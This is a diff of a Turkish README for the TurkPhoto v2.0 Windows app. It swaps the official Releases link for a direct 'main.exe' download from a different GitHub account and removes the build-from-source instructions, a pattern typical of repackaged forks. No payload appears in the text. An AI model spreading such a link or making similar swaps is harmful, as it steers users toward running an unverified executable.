@@ -23,23 +23,9 @@
 TurkPhoto v2.0 tamamen taşınabilir (portable) ve bağımsız bir Windows uygulamasıdır.
 
 ### Yöntem 1: Doğrudan Çalıştırma (Tavsiye Edilen)
-1. **[Releases](../../releases)** sayfasından en son **`TurkPhoto.exe`** (v2.0) dosyasını indirin.
+1. **[TurkPhoto v2.0 İndir](https://github.com/arduinocuyt-droid/TurkPhoto/releases/download/v2.0/main.exe)** bağlantısına tıklayarak dosyayı indirin.
 2. Bilgisayarınızda **Python, PyQt6 veya NumPy yüklü olmasına gerek yoktur.**
-3. İndirdiğiniz **`TurkPhoto.exe`** dosyasına çift tıklayarak uygulamayı doğrudan başlatın!
+3. İndirdiğiniz dosyaya çift tıklayarak uygulamayı doğrudan başlatın!
 
 ---
 
-### Yöntem 2: Kaynak Koddan Çalıştırma (Geliştiriciler İçin)
-
-Eğer kaynak kodu düzenlemek veya Python üzerinden çalıştırmak isterseniz:
-
-```bash
-# 1. Depoyu klonlayın
-git clone [https://github.com/mucitemos/TurkPhoto.git](https://github.com/mucitemos/TurkPhoto.git)
-cd TurkPhoto
-
-# 2. Gerekli kütüphaneleri yükleyin
-pip install PyQt6 numpy
-
-# 3. Uygulamayı konsolsuz başlatın
-pythonw main.pyw
